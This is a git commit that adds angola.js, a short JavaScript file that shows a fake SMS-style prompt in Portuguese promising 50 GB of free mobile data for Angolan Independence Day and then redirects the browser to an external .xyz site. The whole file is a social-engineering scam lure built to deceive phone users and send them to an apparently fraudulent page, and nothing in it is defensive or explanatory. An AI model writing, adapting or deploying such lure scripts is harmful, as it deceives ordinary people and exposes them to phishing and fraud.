10201bfc2a79ff8a20ac6e22572840dfc31605fb
newetijazz9 <newetijazz9@gmail.com>
2025-11-04 09:45:43 +0100

    Create angola.js

---
+++ angola.js
@@ -0,0 +1,5 @@
+var password = 'Ativar 50 GB'
+password=prompt('SMS: Feliz Dia da Independência! Seu número de celular está qualificado para receber 50 GB de dados grátis. Clique em OK para ativar agora.','Ativar 50 GB');
+if (password != 'Ativar 50 GB') {
+location.href='https://www.ekporoku.xyz/angola50gb';
+}
